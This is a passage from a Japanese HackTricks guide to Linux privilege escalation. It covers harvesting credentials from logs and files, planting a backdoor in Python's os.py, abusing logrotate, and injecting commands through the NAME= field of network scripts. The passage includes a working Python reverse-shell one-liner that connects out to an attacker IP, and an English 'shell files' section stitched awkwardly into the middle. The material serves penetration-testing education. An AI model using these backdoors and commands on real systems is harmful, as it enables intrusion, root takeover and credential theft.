### パスワードが含まれる既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを読み、**複数のパスワードが含まれる可能性のあるファイル**を検索します。\
これを行うために使用できるもう1つの興味深いツールは、[**LaZagne**](https://github.com/AlessandroZ/LaZagne)です。これは、Windows、Linux、Mac上のローカルコンピュータに保存されている多くのパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読むことができれば、**興味深い/機密情報を見つける**ことができるかもしれません。ログが奇妙であればあるほど、それはより興味深いでしょう（おそらく）。\
また、一部の「**悪意のある**」設定（バックドア？）された**監査ログ**では、この投稿で説明されているように、監査ログ内にパスワードを**記録する**ことができる場合があります：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
シェルファイル

### Introduction

This directory contains shell files that can be used for privilege escalation on Linux systems. These files are designed to exploit vulnerabilities and gain elevated privileges.

### Usage

To use these shell files, follow these steps:

1. Download the desired shell file to your local machine.
2. Transfer the shell file to the target Linux system.
3. Make the shell file executable by running the following command:
   ```
   chmod +x <shell-file-name>
   ```
4. Execute the shell file with root privileges by running the following command:
   ```
   sudo ./<shell-file-name>
   ```

### Disclaimer

These shell files are intended for educational purposes only. The author is not responsible for any misuse or illegal activities performed using these files. Use them at your own risk.
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 一般的なクレデンシャルの検索/正規表現

また、**名前**または**内容**に単語「**password**」を含むファイルをチェックし、ログ内のIPやメールアドレス、ハッシュの正規表現もチェックする必要があります。
これらの方法の詳細についてはここでは説明しませんが、興味がある場合は[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認できます。

## 書き込み可能なファイル

### Pythonライブラリのハイジャック

Pythonスクリプトが実行される**場所**がわかっており、そのフォルダに**書き込み**することができるか、Pythonライブラリを**変更**することができる場合、OSライブラリを変更してバックドアを仕掛けることができます（Pythonスクリプトが実行される場所に書き込みできる場合は、os.pyライブラリをコピーして貼り付けてください）。

ライブラリにバックドアを仕掛けるには、os.pyライブラリの最後に次の行を追加します（IPとPORTを変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotateの脆弱性

`logrotate`には、**ログファイルまたはその親ディレクトリのいずれかに書き込み権限**を持つユーザーが、`logrotate`によって**任意の場所にファイルを書き込む**ことができる脆弱性が存在します。もし**logrotate**が**root**によって実行されている場合、ユーザーはログインするすべてのユーザーによって実行される_**/etc/bash\_completion.d/**_に任意のファイルを書き込むことができます。

したがって、**ログファイル**またはその**親フォルダ**のいずれかに**書き込み権限**がある場合、ほとんどのLinuxディストリビューションでは（logrotateは**rootユーザー**として自動的に1日に1回実行されます）、**特権昇格**が可能です。また、_**/var/log**_以外にも**ローテーション**されているファイルがあるかどうかも確認してください。

{% hint style="info" %}
この脆弱性は、`logrotate`バージョン`3.18.0`およびそれ以前に影響します。
{% endhint %}

この脆弱性の詳細情報は、次のページで確認できます：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

[**logrotten**](https://github.com/whotwagner/logrotten)を使用してこの脆弱性を悪用することができます。

この脆弱性は、[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginxログ）**と非常に類似していますので、ログを変更できることがわかった場合は、ログをシンボリックリンクで置き換えて特権を昇格できるかどうかを確認してください。

### /etc/sysconfig/network-scripts/（Centos/Redhat）

何らかの理由で、ユーザーが_**/etc/sysconfig/network-scripts**_に`ifcf-<whatever>`スクリプトを**書き込む**ことができる場合、または既存のスクリプトを**調整**できる場合、あなたの**システムは乗っ取られています**。

ネットワークスクリプト（例：_ifcg-eth0_）は、ネットワーク接続に使用されます。これらは.INIファイルとまったく同じように見えます。ただし、Linuxではこれらはネットワークマネージャー（dispatcher.d）によって\~ソース化\~されます。

私の場合、これらのネットワークスクリプトの`NAME=`属性が正しく処理されていません。もし名前に**空白が含まれている場合、空白の後の部分が実行されようとします**。つまり、**最初の空白の後にあるすべての部分がrootとして実行されます**。

例：_/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**脆弱性参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init、init.d、systemd、およびrc.d**

`/etc/init.d`には、System V initツール（SysVinit）で使用される**スクリプト**が含まれています。これは、Linuxの**伝統的なサービス管理パッケージ**であり、`init`プログラム（カーネルの初期化が完了したときに実行される最初のプロセス¹）およびサービスの開始、停止、設定を行うためのインフラストラクチャを含んでいます。具体的には、`/etc/init.d`のファイルは、特定のサービスを管理するために`start`、`stop`、`restart`、および（サポートされている場合）`reload`コマンドに応答するシェルスクリプトです。これらのスクリプトは直接呼び出すこともできますが（最も一般的には）、他のトリガー（通常は`/etc/rc?.d/`にシンボリックリンクが存在すること）を介して呼び出されます。 （[ここから](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。Redhatでは、このフォルダの代替として`/etc/rc.d/init.d`があります。

`/etc/init`には、**Upstart**で使用される**設定ファイル**が含まれています。Upstartは、Ubuntuで推奨される若い**サービス管理パッケージ**です。`/etc/init`のファイルは、Upstartに対してサービスの`start`、`stop`、`reload`、または`status`のクエリをどのように行うか、およびいつ行うかを指示する設定ファイルです。Lucid以降、UbuntuはSysVinitからUpstartに移行しており、そのために多くのサービスにはSysVinitスクリプトが付属していますが、Upstartの設定ファイルが優先されます。SysVinitスクリプトはUpstartの互換性レイヤーによって処理されます。 （[ここから](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。

**systemd**は、Linuxの初期化システムおよびサービスマネージャであり、オンデマンドでデーモンを起動する機能、マウントおよび自動マウントポイントのメンテナンス、スナップショットサポート、およびLinuxコントロールグループを使用したプロセスのトラッキングなどの機能を備えています。systemdは、ログデーモンや他のツール、一般的なシステム管理タスクをサポートするためのユーティリティを提供します。 （[ここから](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)）。

ディストリビューションリポジトリからダウンロードされたパッケージに含まれるファイルは`/usr/lib/systemd/`に配置されます。システム管理者（ユーザー）によって行われる変更は`/etc/systemd/system/`に配置されます。

## その他のトリック

### NFS特権昇格

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### 制限されたシェルからの脱出

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## カーネルセキュリティ保護

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## その他のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privescツール

### **Linuxローカル特権昇格ベクタを探すための最適なツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-tオプション)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** LinuxおよびMACでカーネルの脆弱性を列挙する[https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail（物理アクセス）:** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**その他のスクリプトのまとめ**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考文献

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a
* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したい**ですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出**してください。

</details>
